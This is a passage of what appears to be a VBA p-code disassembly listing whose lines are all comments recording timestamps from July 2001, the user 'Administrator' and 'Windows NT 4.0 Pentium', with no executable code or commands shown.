' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #351:
' Line #352:
' Line #353:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:40:54"
' Line #354:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #356:
' Line #357:
' Line #358:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:41:37"
' Line #359:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #361:
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:41:38"
' Line #364:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #366:
' Line #367:
' Line #368:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:42:36"
' Line #369:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #371:
' Line #372:
' Line #373:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:42:59"
' Line #374:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #376:
' Line #377:
' Line #378:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:43:20"
' Line #379:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #381:
' Line #382:
' Line #383:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:01:30"
' Line #384:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #386:
' Line #387:
' Line #388:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:01:37"
' Line #389:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #391:
' Line #392:
' Line #393:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:01:43"
' Line #394:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #396:
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:03:15"
' Line #399:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #401:
' Line #402:
' Line #403:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:04:47"
' Line #404:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #406:
' Line #407:
' Line #408:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:06:54"
' Line #409:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #411:
' Line #412:
' Line #413:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:07:44"
' Line #414:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #416:
' Line #417:
' Line #418:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:09:29"
' Line #419:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #421:
' Line #422:
' Line #423:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:11:35"
' Line #424:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #426:
' Line #427:
' Line #428:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:12:55"
' Line #429:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #431:
' Line #432:
' Line #433:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:14:15"
' Line #434:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #436:
' Line #437:
' Line #438:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:17:15"
' Line #439:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #441:
' Line #442:
' Line #443:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:18:22"
' Line #444:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #446:
' Line #447:
' Line #448:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:21:25"
' Line #449:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #451:
' Line #452:
' Line #453:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:22:13"
' Line #454:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #456:
' Line #457:
' Line #458:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:24:44"
' Line #459:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #461:
' Line #462:
' Line #463:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:28:53"
' Line #464:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #465:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #466:
' Line #467:
' Line #468:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:30:52"
' Line #469:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #471:
' Line #472:
' Line #473:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:35:16"
' Line #474:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #476:
' Line #477:
' Line #478:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:37:02"
' Line #479:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #481:
' Line #482:
' Line #483:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:38:51"
' Line #484:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #485:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #486:
' Line #487:
' Line #488:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:40:33"
' Line #489:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #490:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #491:
' Line #492:
' Line #493:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:41:53"
' Line #494:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #495:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #496:
' Line #497:
' Line #498:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:43:23"
' Line #499:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #500:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #501:
' Line #502:
' Line #503:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:46:44"
' Line #504:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #505:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #506:
' Line #507:
' Line #508:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:49:01"
' Line #509:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #510:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #511:
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:50:48"
' Line #514:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #515:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #516:
' Line #517:
' Line #518:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:52:15"
' Line #519:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #520:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #521:
' Line #522:
' Line #523:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:53:45"
' Line #524:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #525:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #526:
' Line #527:
' Line #528:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:55:19"
' Line #529:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #530:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #531:
' Line #532:
' Line #533:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:56:39"
' Line #534:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #535:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #536:
' Line #537:
' Line #538:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:56:42"
' Line #539:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #540:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #541:
' Line #542:
' Line #543:
' 	QuoteRem 0x0000 0x0011 "29.07.01 10:56:43"
' Line #544:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #545:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #546:
' Line #547:
' Line #548:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:00:09"
' Line #549:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #550:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #551:
' Line #552:
' Line #553:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:04:24"
' Line #554:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #555:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #556:
' Line #557:
' Line #558:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:05:12"
' Line #559:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #561:
' Line #562:
' Line #563:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:05:53"
' Line #564:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #566:
' Line #567:
' Line #568:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:07:35"
' Line #569:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #571:
' Line #572:
' Line #573:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:08:27"
' Line #574:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #576:
' Line #577:
' Line #578:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:09:08"
' Line #579:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #581:
' Line #582:
' Line #583:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:11:32"
' Line #584:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #586:
' Line #587:
' Line #588:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:13:09"
' Line #589:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #591:
' Line #592:
' Line #593:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:14:07"
' Line #594:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #596:
' Line #597:
' Line #598:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:15:24"
' Line #599:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #601:
' Line #602:
' Line #603:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:16:20"
' Line #604:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #606:
' Line #607:
' Line #608:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:19:15"
' Line #609:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #611:
' Line #612:
' Line #613:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:20:25"
' Line #614:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #616:
' Line #617:
' Line #618:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:21:18"
' Line #619:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #621:
' Line #622:
' Line #623:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:21:21"
' Line #624:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #626:
' Line #627:
' Line #628:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:23:47"
' Line #629:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #631:
' Line #632:
' Line #633:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:25:52"
' Line #634:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #636:
' Line #637:
' Line #638:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:26:49"
' Line #639:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #641:
' Line #642:
' Line #643:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:28:02"
' Line #644:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #646:
' Line #647:
' Line #648:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:29:37"
' Line #649:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #651:
' Line #652:
' Line #653:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:30:39"
' Line #654:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #656:
' Line #657:
' Line #658:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:32:50"
' Line #659:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #661:
' Line #662:
' Line #663:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:35:21"
' Line #664:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #666:
' Line #667:
' Line #668:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:36:39"
' Line #669:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #671:
' Line #672:
' Line #673:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:39:12"
' Line #674:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #676:
' Line #677:
' Line #678:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:40:45"
' Line #679:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #681:
' Line #682:
' Line #683:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:42:45"
' Line #684:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #686:
' Line #687:
' Line #688:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:43:58"
' Line #689:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #691:
' Line #692:
' Line #693:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:45:29"
' Line #694:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #696:
' Line #697:
' Line #698:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:46:13"
' Line #699:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #701:
' Line #702:
' Line #703:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:47:18"
' Line #704:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #706:
' Line #707:
' Line #708:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:48:37"
' Line #709:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #711:
' Line #712:
' Line #713:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:52:51"
' Line #714:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #715:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #716:
' Line #717:
' Line #718:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:54:45"
' Line #719:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #720:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #721:
' Line #722:
' Line #723:
' 	QuoteRem 0x0000 0x0011 "29.07.01 11:55:54"
' Line #724:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #725:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #726:
' Line #727:
' Line #728:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:01:13"
' Line #729:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #730:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #731:
' Line #732:
' Line #733:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:01:59"
' Line #734:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #735:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #736:
' Line #737:
' Line #738:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:02:39"
' Line #739:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #740:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #741:
' Line #742:
' Line #743:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:03:46"
' Line #744:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #745:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #746:
' Line #747:
' Line #748:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:23:27"
' Line #749:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #750:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #751:
' Line #752:
' Line #753:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:24:04"
' Line #754:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #755:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #756:
' Line #757:
' Line #758:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:26:09"
' Line #759:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #760:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #761:
' Line #762:
' Line #763:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:28:10"
' Line #764:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #765:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #766:
' Line #767:
' Line #768:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:29:06"
' Line #769:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #770:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #771:
' Line #772:
' Line #773:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:30:14"
' Line #774:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #775:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #776:
' Line #777:
' Line #778:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:37:30"
' Line #779:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #780:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #781:
' Line #782:
' Line #783:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:38:26"
' Line #784:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #785:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #786:
' Line #787:
' Line #788:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:39:51"
' Line #789:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #790:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #791:
' Line #792:
' Line #793:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:42:01"
' Line #794:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #795:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #796:
' Line #797:
' Line #798:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:44:03"
' Line #799:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #800:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #801:
' Line #802:
' Line #803:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:45:23"
' Line #804:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #805:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #806:
' Line #807:
' Line #808:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:46:58"
' Line #809:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #810:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #811:
' Line #812:
' Line #813:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:47:24"
' Line #814:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #815:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #816:
' Line #817:
' Line #818:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:48:53"
' Line #819:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #820:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #821:
' Line #822:
' Line #823:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:50:04"
' Line #824:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #825:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #826:
' Line #827:
' Line #828:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:50:55"
' Line #829:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #830:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #831:
' Line #832:
' Line #833:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:51:33"
' Line #834:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #835:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #836:
' Line #837:
' Line #838:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:53:54"
' Line #839:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #840:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #841:
' Line #842:
' Line #843:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:55:03"
' Line #844:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #845:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #846:
' Line #847:
' Line #848:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:56:18"
' Line #849:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #850:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #851:
' Line #852:
' Line #853:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:58:42"
' Line #854:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #855:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #856:
' Line #857:
' Line #858:
' 	QuoteRem 0x0000 0x0011 "29.07.01 12:59:38"
' Line #859:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #860:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #861:
' Line #862:
' Line #863:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:00:55"
' Line #864:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #865:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #866:
' Line #867:
' Line #868:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:02:28"
' Line #869:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #870:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #871:
' Line #872:
' Line #873:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:04:37"
' Line #874:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #875:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #876:
' Line #877:
' Line #878:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:09:05"
' Line #879:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #880:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #881:
' Line #882:
' Line #883:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:10:59"
' Line #884:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #885:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #886:
' Line #887:
' Line #888:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:13:28"
' Line #889:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #890:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #891:
' Line #892:
' Line #893:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:14:36"
' Line #894:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #895:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #896:
' Line #897:
' Line #898:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:15:48"
' Line #899:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #900:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #901:
' Line #902:
' Line #903:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:19:57"
' Line #904:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #905:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #906:
' Line #907:
' Line #908:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:19:59"
' Line #909:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #910:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #911:
' Line #912:
' Line #913:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:23:16"
' Line #914:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #915:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #916:
' Line #917:
' Line #918:
